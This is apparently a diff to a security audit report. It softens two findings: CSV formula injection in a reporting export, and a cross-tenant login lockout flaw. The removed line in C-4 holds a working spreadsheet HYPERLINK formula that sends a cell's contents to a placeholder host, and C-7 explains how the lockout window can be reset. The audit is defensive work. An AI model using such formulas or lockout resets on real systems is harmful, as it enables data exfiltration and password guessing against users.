@@ -99,8 +99,7 @@ sites in `src/http/server.ts`, `src/http/routes.ts`,
   (`instance-visibility-set`, `end-user-app`).
 
 ### C-4: The CSV export has no guard against formula injection
-- Case: a participant enters
-  `=HYPERLINK("https://x.example/?"&B2;"Details")` in a text field. The
+- Case: a participant enters a spreadsheet formula in a text field. The
   process owner downloads `GET /reporting/reports/:id/table.csv` and opens the
   file in Excel. Excel evaluates the cell as a formula. The function
   `csvField` adds quotes only for `"`, `,`, CR or LF. A leading `=`, `+`, `-`,
@@ -167,14 +166,13 @@ sites in `src/http/server.ts`, `src/http/routes.ts`,
   (`reporting-data-tables`).
 
 ### C-7: The login lockout counts per email across all tenants
-- Case: SaaS mode. Tenant `acme` has `eve@corp.example`, and tenant `beta` has
-  another account with the same address. An attacker tries passwords through
-  `beta.detent.example`. After every fourth try, he authenticates through
-  `acme.detent.example` with his own account of the same address. Then
-  `loginAttempts.delete(normalizedEmail)` also resets the email window for
-  `beta`. Against the `beta` account, only the window per address remains.
-  Conversely, failed tries in one tenant lock the same address in every
-  other tenant.
+- Case: in SaaS mode, two tenants each hold an account with the same email
+  address. The login lockout counts failed tries per email, across all
+  tenants. A successful login in one tenant runs
+  `loginAttempts.delete(normalizedEmail)`. That call also resets the email
+  window for the other tenant. Against the other tenant's account, only the
+  window per address remains. Conversely, failed tries in one tenant lock the
+  same address in every other tenant.
 - Location: `src/auth/login.ts:54`, `:145-146`, `:155`
 - Severity: medium
 - Evidence: confirmed. The key is only `normalizedEmail` (`:145`). The value
